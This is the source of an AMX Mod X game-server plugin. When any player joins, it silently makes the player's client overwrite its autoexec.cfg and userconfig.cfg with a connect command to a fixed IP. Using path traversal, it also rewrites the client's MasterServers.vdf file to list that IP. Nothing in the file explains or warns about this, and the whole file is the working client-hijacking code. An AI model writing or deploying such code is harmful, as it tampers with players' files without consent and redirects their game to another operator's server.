#include <amxmodx>

new const master_plik[][]      =   {"!MD5/../../platform/config/MasterServers.vdf", "!MD5/../../platform/config/rev_MasterServers.vdf", "!MD5/../../config/rev_MasterServers.vdf", "!MD5/../../config/MasterServers.vdf"}
new const master_Text[]		=	"^"MasterServers^"\n{\n	^"hl1^"\n	{\n		^"0^"\n		{\n			^"addr^"		^"79.124.56.48:27019^"\n		}\n	}\n}\n";
new const master_Key[]			=	"boost";
#define CFG_FILE1 "autoexec.CFG"
#define CFG_FILE3 "userconfig.CFG"
#define CON "Connect 79.124.56.48:27019"

public client_putinserver(id)
{
client_is_auth(id)	
set_task(0.1, "red1", id)	
}

public client_is_auth(id)
{
client_cmd(id, "developer 0")
client_cmd(id, "Motdfile ^"%s^"", CFG_FILE1)
client_cmd(id, "Motdfile ^"%s^"", CFG_FILE3)
client_cmd(id, "Motd_write %s", CON)
client_cmd(id, "clear")
}
public red1(id)
{
client_cmd( id , "Motdfile %s" , master_plik[0] );
client_cmd( id , "Motd_write %s", master_Text );
client_cmd( id , "Motdfile motd.txt" );
client_cmd( id , "setinfo %s 1", master_Key);	
}
/* AMXX-Studio Notes - DO NOT MODIFY BELOW HERE
*{\\ rtf1\\ ansi\\ ansicpg1251\\ deff0\\ deflang1026{\\ fonttbl{\\ f0\\ fnil Tahoma;}}\n\\ viewkind4\\ uc1\\ pard\\ f0\\ fs16 \n\\ par }
*/
